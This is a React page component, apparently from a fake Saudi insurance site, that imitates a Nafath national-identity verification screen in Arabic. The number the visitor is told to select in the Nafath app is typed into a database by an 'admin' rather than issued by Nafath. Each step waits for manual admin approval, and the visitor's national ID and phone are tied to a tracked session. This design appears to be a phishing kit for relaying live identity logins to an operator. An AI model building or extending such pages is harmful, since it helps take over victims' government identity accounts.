import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { RefreshCw, Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { supabase } from "@/integrations/supabase/client";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import biometricIllustration from "@/assets/biometric-verify-illustration.png";

const NafathVerify = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const nationalId = location.state?.nationalId;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const [verifyNumber, setVerifyNumber] = useState<string | null>(null);

  const approvalStatus = useAdminApproval(orderId, "nafath_verify");

  // Fetch nafath_number from admin
  useEffect(() => {
    if (!orderId) return;
    const fetchNumber = async () => {
      const { data } = await supabase
        .from("insurance_orders")
        .select("nafath_number")
        .eq("id", orderId)
        .maybeSingle();
      if (data?.nafath_number) setVerifyNumber(data.nafath_number);
    };
    fetchNumber();

    const channel = supabase
      .channel(`nafath-number-${orderId}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "insurance_orders", filter: `id=eq.${orderId}` }, (payload: any) => {
        if (payload.new.nafath_number) setVerifyNumber(payload.new.nafath_number);
      })
      .subscribe();

    const interval = setInterval(async () => {
      const { data } = await supabase
        .from("insurance_orders")
        .select("nafath_number")
        .eq("id", orderId)
        .maybeSingle();
      if (data?.nafath_number) setVerifyNumber(data.nafath_number);
    }, 3000);

    return () => { supabase.removeChannel(channel); clearInterval(interval); };
  }, [orderId]);

  // Handle admin approval
  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success("تم التحقق بنجاح");
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/confirmation", { state: { offer, phone, carrier, nationalId, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error("تم رفض عملية التحقق");
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier, nationalId]);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  const handleConfirm = async () => {
    setLoading(true);
    if (nationalId) linkVisitorToSession({ national_id: nationalId });
    const id = await createOrUpdateStage(orderId, "nafath_verify");
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => {
    setTimer(120);
    setCanResend(false);
  };

  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  return (
    <VerificationLayout title="التحقق عبر تطبيق نفاذ" subtitle="الرجاء فتح تطبيق نفاذ واختيار الرقم الصحيح">

      {/* Title */}
      <div className="text-center pt-5 pb-2">
        <h2 className="text-lg font-bold text-primary">التحقق عبر تطبيق نفاذ</h2>
        <p className="text-[11px] text-muted-foreground mt-1">الرجاء فتح تطبيق نفاذ واختيار الرقم الصحيح</p>
      </div>

      {/* Verify Number */}
      <div className="flex flex-col items-center py-5 gap-2">
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", delay: 0.2 }}
          className="w-24 h-24 rounded-2xl bg-accent border-2 border-primary flex items-center justify-center shadow-sm"
        >
          {verifyNumber ? (
            <span className="text-4xl font-bold text-primary">{verifyNumber}</span>
          ) : (
            <Loader2 className="w-8 h-8 text-primary animate-spin" />
          )}
        </motion.div>
        {!verifyNumber && (
          <p className="text-[11px] text-muted-foreground animate-pulse">يرجى الانتظار... سيظهر الرقم أمامك خلال لحظات</p>
        )}
      </div>

      <div className="px-5 pb-4 space-y-4">
        {waitingApproval ? (
          <div className="text-center py-6 space-y-4">
            <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
            <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
            <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة التحقق</p>
          </div>
        ) : (
          <>
            {/* Instructions */}
            <div className="bg-secondary/50 rounded-lg p-3 space-y-2 text-right">
              <p className="text-xs text-foreground leading-relaxed">
                افتح تطبيق <span className="font-bold text-primary">نفاذ</span> على جوالك وأكد الطلب باختيار الرقم <span className="font-bold text-primary">{verifyNumber || "..."}</span>
              </p>
              <p className="text-[10px] text-muted-foreground">قد تحتاج للتحقق عبر بصمة الوجه أو الإصبع</p>
            </div>

            {/* Biometric illustration */}
            <div className="flex justify-center">
              <motion.img
                src={biometricIllustration}
                alt="التحقق البيومتري"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                className="w-44 h-44 object-contain"
                loading="lazy"
              />
            </div>

            {/* Timer */}
            <div className="text-center">
              {canResend ? (
                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-medium">
                  <RefreshCw className="w-3.5 h-3.5" />
                  إرسال رمز جديد
                </button>
              ) : (
                <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-4 py-1.5">
                  <span className="text-[10px] text-muted-foreground">صلاحية الرمز</span>
                  <span className="text-xs text-primary font-bold font-mono">{fmt(timer)}</span>
                </div>
              )}
            </div>

            {/* Confirm */}
            <button
              onClick={handleConfirm}
              disabled={loading}
              className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-2.5 font-bold text-xs transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <Loader2 className="w-3.5 h-3.5 animate-spin" />
                  جاري التحقق...
                </>
              ) : "تم التأكيد من التطبيق"}
            </button>
          </>
        )}
      </div>

    </VerificationLayout>
  );
};

export default NafathVerify;
